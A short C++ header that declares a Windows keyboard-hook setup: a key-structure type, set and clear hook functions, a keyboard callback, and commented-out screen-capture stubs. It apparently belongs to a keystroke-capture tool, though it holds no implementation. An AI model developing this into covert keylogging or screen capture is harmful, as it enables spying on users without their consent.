#pragma once
#include <Windows.h>
#include <tlhelp32.h>
#include <string>



struct keyStruct {
	unsigned int scanCode;
	unsigned int charCode;
	char* keystr;
};


BOOL setMyHook();
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
BOOL clearMyHook();
//void CaptureScreen(HWND window, wchar_t *filename);
//void mainFunc();

static HHOOK hook;
static bool hWndServer = false;

